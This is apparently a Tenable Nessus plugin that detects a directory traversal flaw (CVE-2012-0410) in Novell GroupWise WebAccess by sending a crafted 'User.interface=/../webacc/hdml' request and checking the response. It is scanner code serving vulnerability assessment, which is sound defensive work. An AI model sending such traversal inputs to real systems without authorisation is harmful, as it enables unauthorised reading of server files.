#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(59968);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2014/08/09 00:11:22 $");

  script_cve_id("CVE-2012-0410");
  script_bugtraq_id(54253);
  script_osvdb_id(83495);

  script_name(english:"Novell GroupWise WebAccess User.interface Directory Traversal");
  script_summary(english:"Attempts directory traversal/XSS");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The application hosted on the remote web server has a directory
traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Novell GroupWise WebAccess hosted on the remote web
server has a directory traversal vulnerability.  Input to the
User.interface parameter is not properly sanitized.  An attacker could
exploit this to download files under the WebAccess directory
structure."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7000708");
  script_set_attribute(attribute:"solution", value:"Upgrade to GroupWise 8.0 Support Pack 3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/07/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:groupwise_webaccess");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

foreach dir (make_list('/gw', '/servlet'))
{
  url = dir + '/webacc?User.interface=/../webacc/hdml';
  res = http_send_recv3(port:port, method:'POST', item:url, data:'', exit_on_fail:TRUE);

  if ('<LINE>Novell GroupWise' >!< res[2] || '<HDML' >!< res[2])
    continue;

  if (report_verbosity > 0)
  {
    if (report_verbosity > 1)
      trailer = 'Which returns the following page :\n\n' + res[2];
    else
      trailer = NULL;

    report = get_vuln_report(port:port, items:url, trailer:trailer);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
  # never reached
}

exit(0, 'The host is not affected on port ' + port + '.');
